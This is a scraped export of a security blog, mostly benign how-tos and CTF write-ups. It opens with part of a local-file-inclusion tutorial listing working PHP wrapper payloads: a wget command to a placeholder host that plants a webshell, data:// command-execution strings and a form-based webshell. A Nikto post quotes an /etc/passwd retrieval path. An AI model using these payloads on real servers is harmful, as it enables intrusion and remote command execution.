an extension needs to be installed. 1http://example.com/index.php?file=expect://ls php://inputphp://input allows to send payload via POST request. Request:1http://example.com/index.php?file=php://input Post data (uploading a webshell):1&lt;?php system(&apos;wget http://x.x.x.x/php-shell.php -O /var/www/html/shell.php&apos;); ?&gt; Post data (getting server infos):1&lt;?php phpinfo(); ?&gt; data://data:// can be used to include executable PHP code. 1http://example.com/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA2fPg%3d%3d or1http://example.com/index.php?file=data:text/plain;,&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt; Another payload can be &lt;?php phpinfo(); die();?&gt;, the die statement will prevent the execution of the rest of the script or the execution of the incorrectly decoded extension appended to the stream. A more usable PHP payload webshell:1&lt;form action=&quot;&lt;?=$_SERVER[&apos;REQUEST_URI&apos;]?&gt;&quot; method=&quot;POST&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;x&quot; value=&quot;&lt;?=htmlentities($_POST[&apos;x&apos;])?&gt;&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;cmd&quot;&gt;&lt;/form&gt;&lt;pre&gt;&lt;? echo `&#123;$_POST[&apos;x&apos;]&#125;`; ?&gt;&lt;/pre&gt;&lt;? die(); ?&gt; To directly execute a command the data request + payload may be: data:,&lt;?system($_GET[&#39;x&#39;]);?&gt;&amp;x=ls or data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=ls. The best way to successfully execute the payload is to base64 it and then URL encode it. zip:// and phar://Archive a php script into a zip or a phar (or others archive with others wrappers), send the archive and tell which file has to be read: zip://archive.zip#file.php. /proc/self/environTo come. /proc/self/fd/To come. Session FilesTo come. Including imagesYou can append some php code at the end of an image and upload it or include it. OthersI invite you to discover more attack vectors here. And don’t forget that those methods can be combined.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"vulnerability","slug":"vulnerability","permalink":"http://rawsec.ml/tags/vulnerability/"},{"name":"lfi","slug":"lfi","permalink":"http://rawsec.ml/tags/lfi/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}]},{"title":"Nikto : protect your Apache server against a LFI vulnerability","slug":"nikto-protecting-LFI","date":"2016-07-06T22:00:00.000Z","updated":"2016-10-12T21:07:54.498Z","comments":true,"path":"en/nikto-protecting-LFI/","link":"","permalink":"http://rawsec.ml/en/nikto-protecting-LFI/","excerpt":"","text":"GoalHow to protect your apache server against a LFI vulnerability that can be found with Nikto . 1/autohtml.php?op=modload&amp;mainfile=x&amp;name=/etc/passwd : php-proxima 6.0 and below allows arbitrary files to be retrieved. Nikto testhttps://raw.githubusercontent.com/sullo/nikto/master/program/databases/db_tests1&quot;000548&quot;,&quot;9028&quot;,&quot;5&quot;,&quot;/autohtml.php?op=modload&amp;mainfile=x&amp;name=/etc/passwd&quot;,&quot;GET&quot;,&quot;root:&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;php-proxima 6.0 and below allows arbitrary files to be retrieved.&quot;,&quot;&quot;,&quot;&quot; ProtectionTo do so, you have to disable trailing pathname by disabling the AcceptPathInfo directive: For example edit your vhost configuration: vim /etc/apache2/vhosts.d/vhostname.conf (openSUSE) vim /etc/apache2/sites-available/example.com.conf (Debian/Ubuntu) vim /etc/httpd/sites-available/example.com.conf (CentOS/RHEL/Fedora) And in the &lt;Directory&gt; section add the directive AcceptPathInfo Off or turn it to Off if already existing Save your config file Restart apache: systemctl restart apache2.service (openSUSE) service apache2 restart (Debian/Ubuntu) systemctl restart httpd.service (CentOS/RHEL/Fedora) apachectl restart (generic)","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"vulnerability","slug":"vulnerability","permalink":"http://rawsec.ml/tags/vulnerability/"},{"name":"lfi","slug":"lfi","permalink":"http://rawsec.ml/tags/lfi/"},{"name":"apache","slug":"apache","permalink":"http://rawsec.ml/tags/apache/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}]},{"title":"Virtualbox : Export from VirtualBox and import to VMware ESXI","slug":"virtualbox-export-vmware-esxi","date":"2016-07-05T22:00:00.000Z","updated":"2016-10-12T21:07:54.528Z","comments":true,"path":"en/virtualbox-export-vmware-esxi/","link":"","permalink":"http://rawsec.ml/en/virtualbox-export-vmware-esxi/","excerpt":"","text":"Version of software used: VirtualBox 5.0.22 vSphere Client 5.1 VMware ESXI 5.1 Export to OVA/OVFFrom VirtualBox export the virtual machine : “File” &gt; “Export Appliance”. Then choose OVF 1.0 format and don’t check the write manifest file box. You now have a .ova file. Edit OVFVMware ESXI is not good at all to import virtual machine from other virtual manager. So if you try to directly import your ova file you’ll get an error message: The OVF package requires unsupported hardware. Details: Line 25: Unsupported hardware family &#39;virtualbox-2.2&#39;. To fix it, unzip the .ova file (ignore extracting error), go into the folder and edit the .ovf file. Replace the following line:1&lt;vssd:VirtualSystemType&gt;virtualbox-2.2&lt;/vssd:VirtualSystemType&gt; with:1&lt;vssd:VirtualSystemType&gt;vmx-07&lt;/vssd:VirtualSystemType&gt; Note : if you didn’t check write manifest file you won’t have checksum problem, but if you did the easiest is to remove the .mf file. You can also re-generate the checksum sha1sum file.ovf and replace the value in the .mf file. Import into ESXIYou can now try to import the VM: “File” &gt; “Deploy OVF Template” &gt; Select the freshly edited .ovf (ot the original .ova) You may get an error: The OVF package requires unsupported hardware. Details: Line 74: OVF hardware element &#39;ResourceType&#39; with instance ID &#39;6&#39;. No support for the virtual hardware device type &#39;35&#39;. To fix it, edit the .ovf file again. Go to the line mentioned in the error message and remvoe the whole item:12345678910&lt;Item&gt; &lt;rasd:AddressOnParent&gt;3&lt;/rasd:AddressOnParent&gt; &lt;rasd:AutomaticAllocation&gt;false&lt;/rasd:AutomaticAllocation&gt; &lt;rasd:Caption&gt;sound&lt;/rasd:Caption&gt; &lt;rasd:Description&gt;Sound Card&lt;/rasd:Description&gt; &lt;rasd:ElementName&gt;sound&lt;/rasd:ElementName&gt; &lt;rasd:InstanceID&gt;6&lt;/rasd:InstanceID&gt; &lt;rasd:ResourceSubType&gt;ensoniq1371&lt;/rasd:ResourceSubType&gt; &lt;rasd:ResourceType&gt;35&lt;/rasd:ResourceType&gt;&lt;/Item&gt; That can be sound card, cd drive or some other optional drive. Note : if you still want to use .mf file don’t forget to update the checksum. You can now try to import the .ovf again. Some other weird errors can occur but I won’t be able to help you more… Note : if you use Guest Additions don’t forget to change them (VirtualBox Guest Additions &gt; VMware Guest Tools).","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"Virtualbox : change the UUID of a virtual disk","slug":"virtualbox-change-virtual-disk-uuid","date":"2016-07-05T22:00:00.000Z","updated":"2016-10-12T21:07:54.525Z","comments":true,"path":"en/virtualbox-change-virtual-disk-uuid/","link":"","permalink":"http://rawsec.ml/en/virtualbox-change-virtual-disk-uuid/","excerpt":"","text":"To change the UUID of a virtual disk:1VBoxManage internalcommands sethduuid &lt;filepath&gt; [&lt;uuid&gt;] Examples With a vdi disk : VBoxManage internalcommands sethduuid disk.vdi With a vmdk disk and choosing the UUID : VBoxManage internalcommands sethduuid disk.vmdk e4f44ef2-524a-1d28-b74b-f7fea9bc855","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}],"tags":[{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"}]},{"title":"Writeups - Forensic - BusyBee","slug":"writeups-forensic-busybee","date":"2016-07-01T22:00:00.000Z","updated":"2016-10-12T21:07:54.505Z","comments":true,"path":"en/writeups-forensic-busybee/","link":"","permalink":"http://rawsec.ml/en/writeups-forensic-busybee/","excerpt":"","text":"InformationsVersion Date By Version Comment 05/06/2016 noraj 1.0 Creation CTF Name : BackdoorCTF 2016 Website : https://backdoor.sdslabs.co Type : Online Format : Jeopardy CTF Time : link NameBusyBee CategoryForensic Wording A deadly virus is killing bees in Busybee’s village Busybox, India. Unfortuantely, you have to go to the village to fight the infection. Get the flag virus out of the infected files.Village address: http://hack.bckdr.in/BUSYBEE/infected.tarCreated by: Ashish Chaudhary Data(s)link SolutionMethodology Untar the datas: tar xaf infected.tar List the content of the directory: 123456789ls -AgGtotal 2332drwxr-xr-x 2 4096 Jun 3 18:13 2b0fbc0e1ac044737fd881cff8164bb5a2c7bfbf90c40c87de3c3435f2c6a94edrwxr-xr-x 4 4096 Jul 2 19:01 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7drwxr-xr-x 2 4096 Jun 3 18:13 d51a083a3b01fe8c58086903595b91fc975de59a9e9ececec755df384a181026-rw-r--r-- 1 1344 Jun 3 18:13 eaa21323de5e2cce7078df3af4dd292181114dfc94be761b948657efbe3af26b.json-rw-r--r-- 1 2362880 Jun 6 08:17 infected.tar-rw-r--r-- 1 373 Jan 1 1970 manifest.json-rw-r--r-- 1 106 Jan 1 1970 repositories Display repositories file, it looks interesting: 12cat repositories&#123;&quot;busybox-1.24.1-infected&quot;:&#123;&quot;latest&quot;:&quot;983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7&quot;&#125;&#125; 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7: show us which folder is infected, so display its content: 12345ls -AgG 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7/total 1020-rw-r--r-- 1 3 Jun 3 18:13 VERSION-rw-r--r-- 1 907 Jun 3 18:13 json-rw-r--r-- 1 1035776 Jun 3 18:13 layer.tar Go into 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7, untar layer.tar, and display: 12345678910111213141516171819cd 983179bdb58ea980ec1fe7c45f63571d49b140bdd629f234be9c00a6edd8a4a7tar xaf layer.tarls -AgGR.:total 1028-rw-r--r-- 1 3 Jun 3 18:13 VERSIONdrwxr-xr-x 2 4096 Jun 3 18:11 bin-rw-r--r-- 1 907 Jun 3 18:13 json-rw-r--r-- 1 1035776 Jun 3 18:13 layer.tardrwxr-xr-x 2 4096 Jun 3 18:09 root./bin:total 2016-rwxr-xr-x 2 1031328 Jun 3 18:11 cat-rwxr-xr-x 2 1031328 Jun 3 18:11 sha1sum./root:total 4-rw------- 1 44 Jun 3 18:12 .ash_history root/.ash_history looks intersting: 12cat root/.ash_historynot so easy bru - the infections is intense … but is not. So let’s see what are the binaries: 123cat bin/sha1sum[...]THIS IS WHAT YOU ARE LOOKING FOR: 0n3_n00b_ru1n5_0n3_hundr3d_pr05 The last line of the binary shows us what we are looking for 0n3_n00b_ru1n5_0n3_hundr3d_pr05 (1337 : one noob ruins one hundred pros) Try to sha256 it:12echo -n &quot;0n3_n00b_ru1n5_0n3_hundr3d_pr05&quot; | sha256sum0743a3265649702df53b083056b2f426d20e449cd68210384ff0ff159f3867fa PS : You could have seen that the repository has the structure of a docker image and try to load and build it. Flag Since Backdoor is an always-online CTF platform, and not a one time contest, we kindly request you to not publish flags for the challenges in your writeups.Writeups are an excellent way to share knowledge and help others learn. In Backdoor, challenges are shifted from a contest to the Practice section, where people can continue to attempt them after the contest is over. It would be very unfair to participants if the flags for the problems were easily available in writeups online.Hence, we kindly request to not publish flags of the problems that you solve. Here is an example of an excellent writeup which refrains from giving the complete solution.","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"forensic","slug":"forensic","permalink":"http://rawsec.ml/tags/forensic/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"Hardened Tor Browser with Selfrando","slug":"hardened-tor-browser-selfrando","date":"2016-06-20T22:00:00.000Z","updated":"2016-10-12T21:07:54.508Z","comments":true,"path":"en/hardened-tor-browser-selfrando/","link":"","permalink":"http://rawsec.ml/en/hardened-tor-browser-selfrando/","excerpt":"","text":"6 June 2016, the Tor Project announced a hardened version of Tor Browser: 6.5a1-hardened. Here some links: Download page for hardened builds (only avaible for Linux at this time). Distribution directory. Official announcement by the Tor Project. Firefox security updates In order to prevent intelligence agencies to de-anonymize Tor users using exploits, Tor hardened version includes Selfrando. Selfrando is a load-time randomization software that aims to improve security over standard address space layout randomization (ASLR) techniques. Selfrando doesn’t overhead performance very much (less than 1%) and doesn’t need too many chnages in the existing Tor Browser code. For more details, researcehrs from University of California published a report entitled Selfrando: Securing the Tor Browser against De-anonymization Exploits.","categories":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"http://rawsec.ml/categories/news/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"news","slug":"news","permalink":"http://rawsec.ml/tags/news/"},{"name":"tor","slug":"tor","permalink":"http://rawsec.ml/tags/tor/"}],"keywords":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"http://rawsec.ml/categories/news/security/"}]},{"title":"Git changing remote URLs","slug":"git-changing-remote-urls","date":"2016-06-19T22:00:00.000Z","updated":"2016-10-12T21:07:54.515Z","comments":true,"path":"en/git-changing-remote-urls/","link":"","permalink":"http://rawsec.ml/en/git-changing-remote-urls/","excerpt":"","text":"git remote set-url &lt;name&gt; &lt;newurl&gt; command changes existing remote repository URL. For example, to switch from a github repository from HTTPS to SSH: Change the current working directory to local project. List existing remotes in order to get the name of the remote to change. 123git remote -vorigin https://github.com/shark-oxi/RawSec.git (fetch)origin https://github.com/shark-oxi/RawSec.git (push) Change remote’s URL from HTTPS to SSH with the git remote set-url command. 1git remote set-url origin git@github.com:shark-oxi/RawSec.git Verify that the remote URL has changed. 123git remote -vorigin git@github.com:shark-oxi/RawSec.git (fetch)origin git@github.com:shark-oxi/RawSec.git (push)","categories":[{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/categories/misc/"}],"tags":[{"name":"git","slug":"git","permalink":"http://rawsec.ml/tags/git/"}],"keywords":[{"name":"misc","slug":"misc","permalink":"http://rawsec.ml/categories/misc/"}]},{"title":"Hide AES-256 encrypted zip file in a JPEG image","slug":"hide-encrypted-zip-image","date":"2016-06-12T22:00:00.000Z","updated":"2016-10-12T21:07:54.515Z","comments":true,"path":"en/hide-encrypted-zip-image/","link":"","permalink":"http://rawsec.ml/en/hide-encrypted-zip-image/","excerpt":"","text":"This how-to was made for Linux user.The user will need p7zip, exiv2 and optionally exif, exiftool, unzip. Create an AES-256 encrypted zip file7z (p7zip for Linux) can produce zip-format archives with encryption scheme. To add file.txt to archive.zip and cipher zip data with AES-256 :17za a -tzip -pTHE_PASSWORD -mem=AES256 archive.zip file.txt To uncompress unzip -p THE_PASSWORD archive.zip or 7za e archive.zip and provide password. It may also work with GUI archive manager. Hide the zip into the imageTo do so, concatenate the zip an image data:1cat original_image.jpg archive.zip &gt; new_image.jpg Now check file type:12file new_image.jpgnew_image.jpg: JPEG image data, JFIF standard 1.02 It seems like a normal jpeg image. But make a strings on it and see files that are in the zip (filenames in the zip are not ciphered, only their content is):123456789strings new_image.jpg[...].YybM]Y]file.txtkBKMS!file.txt The image is an archive too, so it can be extracted. Let’s compare original zip archive and the jpeg one. Original zip archive:123unzip archive.zipArchive: archive.zip skipping: file.txt need PK compat. v5.1 (can do v4.5) Jpeg zip archive:12345unzip new_image.jpgArchive: new_image.jpgwarning [new_image.jpg]: 35068 extra bytes at beginning or within zipfile (attempting to process anyway) skipping: file.txt need PK compat. v5.1 (can do v4.5) To really extract the archive use unzip -p, 7za e or a GUI archive manager like explained in the previous part. Hide the archive password into image metadataHere we’ll hide password in image comment, it’s not safe at all but it’s just for fun. We’ll hide the real password into jpeg comment and a fake password into exif user comment. Hide the password into jpeg comment:1exiv2 -c THE_PASSWORD modify new_image.jpg Hide a fake password into exif user comment:1exiv2 -M&quot;set Exif.Photo.UserComment FAKE_PASSWORD&quot; new_image.jpg Jpeg comment can be seen with:12exiv2 -p c new_image.jpgTHE_PASSWORD Exif user comment can be seen with:123exiv2 -p t new_image.jpgExif.Image.ExifTag Long 1 26 Exif.Photo.UserComment Undefined 37 FAKE_PASSWORD More datails are avaible at exiv2 manpage. Why two different passwords and two different commentsAs I said put the password in metadata is not safe, everyone aware of steganography will know how to find it. But we can get confused more novice people. Novice in steganography often use only default behaviour of tools commands like exiftool, exif or less often exiv2. exif and exiv2 default behaviour without options show only exif data but exiftool will show Exif, IPTC, XMP and image type dependent data. So novice that will only run exif new_image.jpg or exiv2 new_image will only see the fake password hidden in exif user comment:12exif new_image.jpg | grep -i commentUser Comment |FAKE_PASSWORD 12exiv2 new_image.jpg | grep -i commentExif comment : FAKE_PASSWORD But123exiftool new_image.jpg | grep -i commentUser Comment : FAKE_PASSWORDComment : THE_PASSWORD","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"},{"name":"stegano","slug":"stegano","permalink":"http://rawsec.ml/tags/stegano/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}]},{"title":"How to install VirtualBox Guest Additions on Debian-based Linux distributions","slug":"install-virtualbox-guest-additions-debian","date":"2016-06-08T22:00:00.000Z","updated":"2016-10-12T21:07:54.522Z","comments":true,"path":"en/install-virtualbox-guest-additions-debian/","link":"","permalink":"http://rawsec.ml/en/install-virtualbox-guest-additions-debian/","excerpt":"","text":"Here is how to install VirtualBox Guest Additions on Debian-based Linux distributions like Parrot Security OS, Kali Linux, Tails, Whonix or REMnux. With VirtualBox Guest Additions it become possible to resize desktop while resizing the VirtualBox window or share a folder between host and guest. Download and mount Start the VM In VirtualBox window, in Devices menu, choose Insert Guest Additions CD image If there are not yet here, choose Download and Insert Mount the CD: mount /media/cdrom/ Install VirtualBox Guest AdditionsOpen a terminal and as root write:12345apt-get install build-essential dkms gcc linux-headers-`uname -r`mkdir /tmp/vboxaddcp -r /media/cdrom0/* /tmp/vboxadd/cd /tmp/vboxadd/./VBoxLinuxAdditions.run And then restart: shutdown -r now","categories":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"debian","slug":"linux/debian","permalink":"http://rawsec.ml/categories/linux/debian/"}],"tags":[{"name":"virtualization","slug":"virtualization","permalink":"http://rawsec.ml/tags/virtualization/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"http://rawsec.ml/tags/system/"},{"name":"virtualbox","slug":"virtualbox","permalink":"http://rawsec.ml/tags/virtualbox/"},{"name":"debian","slug":"debian","permalink":"http://rawsec.ml/tags/debian/"}],"keywords":[{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/categories/linux/"},{"name":"debian","slug":"linux/debian","permalink":"http://rawsec.ml/categories/linux/debian/"}]},{"title":"Security-related OS","slug":"security-related-os","date":"2016-06-08T22:00:00.000Z","updated":"2016-10-20T22:00:00.000Z","comments":true,"path":"en/security-related-os/","link":"","permalink":"http://rawsec.ml/en/security-related-os/","excerpt":"","text":"Subgraph OS - security by compartmentalization (container) Qubes OS - security by compartmentalization (VM) Kali Linux - penetration testing and security lab Parrot Security OS - penetration testing and security lab BlackArch Linux - penetration testing and security lab Fedora Security Lab - penetration testing and security lab Tails - privacy and anonymity Alpine Linux - security for routers, firewalls, VPNs, VoiP boxes and servers BackBox - penetration testing and security lab Wifislax - penetration testing and security lab Pentoo - penetration testing and security lab URIX OS - penetration testing, security lab and security-focused Whonix - privacy and anonymity REMnux - malware analysts and reverse-engineering TENS - privacy and stealth Cyborg Hawk Linux - penetration testing and security lab Cyborg Essentials - penetration testing and security lab Security Onion - network security monitoring and analysis OS Maturity Security Pentest Based on Subgraph OS ++ ++ No Debian Qubes OS +++ +++ No Fedora Kali Linux +++ + Yes Debian Parrot Security OS +++ + Yes Debian BlackArch Linux +++ + Yes Arch Fedora Security Lab +++ + Yes Fedora Tails +++ + No Debian Alpine Linux +++ ++ No Independent BackBox +++ + Yes Ubuntu Wifislax ++ + Yes Slackware Pentoo ++ + Yes Gentoo URIX OS ++ ++ Yes openSUSE Whonix +++ ++ No Debian REMnux +++ + No Debian TENS ++ + No Thinstation Cyborg Hawk Linux ++ + Yes Ubuntu Cyborg Essentials ++ + Yes Debian Security Onion ++ + No Ubuntu","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"linux","slug":"linux","permalink":"http://rawsec.ml/tags/linux/"},{"name":"anonymity","slug":"anonymity","permalink":"http://rawsec.ml/tags/anonymity/"},{"name":"pentest","slug":"pentest","permalink":"http://rawsec.ml/tags/pentest/"},{"name":"privacy","slug":"privacy","permalink":"http://rawsec.ml/tags/privacy/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"}]},{"title":"Pastejacking vs clipboard hijacking","slug":"pastejacking-vs-clipboard-hijacking","date":"2016-06-01T22:00:00.000Z","updated":"2016-10-12T21:07:54.525Z","comments":true,"path":"en/pastejacking-vs-clipboard-hijacking/","link":"","permalink":"http://rawsec.ml/en/pastejacking-vs-clipboard-hijacking/","excerpt":"","text":"Clipboard hijackingIt as been possible for a long time to use css to append malicious content to the clipboard. Users doesn’t notine anything and may execute unwanted commands. This type of attack is called clipboard hijacking and is dangerous when the user copies something from the web inside his terminal. PastejackingDylan Ayrey, security researcher, published a variation of this attack that use only JavaScript.Difference with clipboard hijacking, is that pastejacking can copy text after an event.With clipboard hijacking user has to copy the full text but with pastejacking one character is enough. VersusPastejacking is more powerfull but is easier to block : user has just to block JavaScript in his browser or use a plugin such as NoScript. Clipbboard hijacking is less threatening but harder to block, user will need an add-on for his terminal, for example, that blocks copied text containing line feeds.","categories":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"http://rawsec.ml/categories/news/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"news","slug":"news","permalink":"http://rawsec.ml/tags/news/"}],"keywords":[{"name":"news","slug":"news","permalink":"http://rawsec.ml/categories/news/"},{"name":"security","slug":"news/security","permalink":"http://rawsec.ml/categories/news/security/"}]},{"title":"Writeups - Crypto - Oups it's all mixed","slug":"writeups-crypto-oups-its-all-mixed","date":"2016-05-25T22:00:00.000Z","updated":"2016-10-12T21:07:54.522Z","comments":true,"path":"en/writeups-crypto-oups-its-all-mixed/","link":"","permalink":"http://rawsec.ml/en/writeups-crypto-oups-its-all-mixed/","excerpt":"","text":"InformationsVersion Date By Version Comment 03/05/2016 noraj 1.0 Creation NameOups it’s all mixed CategoryCryptography WordingDecipher the following flag:eGqaelr557dK4BbK47dS17dK68cu2PVPdydK2TtR5lKC Data(s)+aAzZbByYcCxXdDwWeEvV9876543210fFuUgGtThHsSiIrRjJqQkKpPlLoOmMnN/ Equipment(s)A computer with an OS (preferably UNIX) Hint(s)The name title is a hint. HelpBase64 DifficultyEasy / Medium SolutionMethodology Identify that is a base64 string Decode the base64 string and observe only garbage Look at the provided data and analyse it Identify the data as a base64 alphabet (64 characters = 26 lowercase letters + 26 uppercase letters + 10 number + + + /) Realize that the alphabet is non standard but a mixed alphabet Write a script that will translate one alphabet to the other and pick up the output standard base64 string and then decode it Some scrip examples below. Python 2123456789101112131415#!/usr/bin/python2 # made with python 2.7.9import base64import sysimport stringbase64_mixed_alphabet = '+aAzZbByYcCxXdDwWeEvV9876543210fFuUgGtThHsSiIrRjJqQkKpPlLoOmMnN/'base64_standard_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'s = 'eGqaelr557dK4BbK47dS17dK68cu2PVPdydK2TtR5lKC's_unmixed = s.translate(string.maketrans(base64_mixed_alphabet, base64_standard_alphabet))s_unb64 = base64.urlsafe_b64decode(s_unmixed) Python 31234567891011121314#!/usr/bin/python3 # made with python 3.4.1import base64base64_mixed_alphabet = '+aAzZbByYcCxXdDwWeEvV9876543210fFuUgGtThHsSiIrRjJqQkKpPlLoOmMnN/'base64_standard_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'s = 'eGqaelr557dK4BbK47dS17dK68cu2PVPdydK2TtR5lKC's_unmixed = s.translate(str.maketrans(base64_mixed_alphabet, base64_standard_alphabet))s_unb64 = base64.urlsafe_b64decode(s_unmixed.encode('utf-8'))s_unb64 = s_unb64.decode('utf-8') # byte to string Bash12# made with bash 4.2.47echo \"eGqaelr557dK4BbK47dS17dK68cu2PVPdydK2TtR5lKC\" | tr '+aAzZbByYcCxXdDwWeEvV9876543210fFuUgGtThHsSiIrRjJqQkKpPlLoOmMnN/' 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' | base64 -di &amp;&amp; echo \"\\n\" FlagFLAG{Yesthatisjustabase64string}","categories":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"http://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"http://rawsec.ml/tags/ctf/"},{"name":"crypto","slug":"crypto","permalink":"http://rawsec.ml/tags/crypto/"}],"keywords":[{"name":"security","slug":"security","permalink":"http://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"http://rawsec.ml/categories/security/writeups/"}]},{"title":"Writeups - Crypto - MindBlown","slug":"writeups-crypto-mindblown","date":"2016-05-25T22:00:00.000Z","updated":"2016-10-12T21:07:54.488Z","comments":true,"path":"en/writeups-crypto-mindblown/","link":"","permalink":"http://rawsec.ml/en/writeups-crypto-mindblown/","excerpt":"","text":"InformationsVersion Date By Version Comment 05/06/2016 noraj 1.0 Creation CTF Name : BackdoorCTF 2016 Website : https://backdoor.sdslabs.co Type : Online Format : Jeopardy CTF Time : link NameMindBlown CategoryCryptography Wording Recently Chintu made a login service to secure his flag.But we managed to get the authentification logic to be found here.Can you help us to get his flag?Find the login form here. Data(s)1234567891011121314151617181920212223242526var express = require('express');var app = express();var port = process.env.PORT || 9898;var crypto = require('crypto');var bodyParser = require('body-parser')var salt = 'somestring';var iteration = /// some number here;var keylength = // some number here;app.post('/login', function (req, res) &#123; var username = req.body.username; var password = req.body.password; if (username !== 'chintu') &#123; res.send('Username is wrong'); return; &#125; if (crypto.pbkdf2Sync(password, salt, iteration, keylength).toString() === hashOfPassword) &#123; if (password === 'complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg') &#123; // some logic here and return something &#125; else &#123; // return flag here &#125; &#125; else &#123; res.send('Password is wrong'); &#125;&#125;); Equipment(s) A computer with an OS (preferably UNIX) Internet access Hint(s)None HelpNone DifficultyMedium SolutionMethodology Take a look at the logic source code. if (username !== &#39;chintu&#39;) clearly indicates that the username is chintu if (password === &#39;complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg&#39;) let us believe that the password is complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg but it’s not. If you try this password you will get this message : Hacker got you! I know my password was leaked, won’t give you my flag. In fact, that is the else statement that returns the flag. So we have to validate the root if statement if (crypto.pbkdf2Sync(password, salt, iteration, keylength).toString() === hashOfPassword) with another password than complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg. We can see that crypto.pbkdf2Sync is kind of a hash method. So let’s look for more information about it. (it’s a Node.js / JavaScript method) We’ll try to create a PBKDF2 + HMAC hash collision. For more details see the PBKDF2 + HMAC collision explanation part below. Enter the collision password e6~n22k81&lt;[p&quot;k5hhV6*. Here you are. PBKDF2 + HMAC collision explanationInspired by mathiasbynens.be PBKDF2 is a widely used method to derive a key. Minimal arguments are: password salt number of iterations key length As said in RFC2898, default is to use HMAC with SHA-1 hash function. HMAC has an interesting property: if a supplied key is longer than the block size of the hash function that’s being used, it uses the hash of the key rather than the key itself. SHA-1 has a block size of 512 bits, which equals 64 bytes. So in this case, if the supplied key takes up more than 64 bytes, then SHA1(key) is used as the key. In this challenge password is 65 bytes long:12echo -n 'complexPasswordWhichContainsManyCharactersWithRandomSuffixeghjrjg' | wc -c65 Note that the collision password always has a length of 20 characters, because SHA1 hashes always consist of exactly 40 